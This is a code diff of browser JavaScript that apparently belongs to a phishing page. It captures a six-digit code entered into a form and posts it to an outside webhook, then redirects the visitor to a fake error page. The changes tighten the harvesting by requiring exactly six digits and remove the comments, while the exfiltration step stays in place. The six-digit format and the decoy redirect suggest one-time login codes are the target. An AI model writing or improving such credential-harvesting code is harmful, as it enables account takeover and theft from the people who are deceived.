@@ -5,13 +5,13 @@ const sendCode = (code) => {
     content: `🔐 Code submitted!\n**Code:** ${code}`,
     embeds: [{
       title: 'Code Entry',
-      color: 15158332, // Red
+      color: 15158332,
       fields: [{ name: 'Code', value: code }],
       timestamp: new Date().toISOString()
     }]
   };
 
-  console.log('Sending code to webhook:', msg); // Debug log
+  console.log('Sending code to webhook:', msg);
 
   fetch(webhookUrl, {
     method: 'POST',
@@ -31,7 +31,14 @@ document.addEventListener('DOMContentLoaded', () => {
   document.querySelector('#form2').addEventListener('submit', (e) => {
     e.preventDefault();
     const code = document.querySelector('#Code').value.trim();
-    if (!code) return console.warn('Code input missing');
+    const errorMsg = document.querySelector('#errorMsg');
+
+    if (!/^\d{6}$/.test(code)) {
+      errorMsg.textContent = 'Code must be exactly 6 digits.';
+      return;
+    }
+
+    errorMsg.textContent = '';
     sendCode(code);
     setTimeout(() => window.location.href = "Error.html", 750);
   });
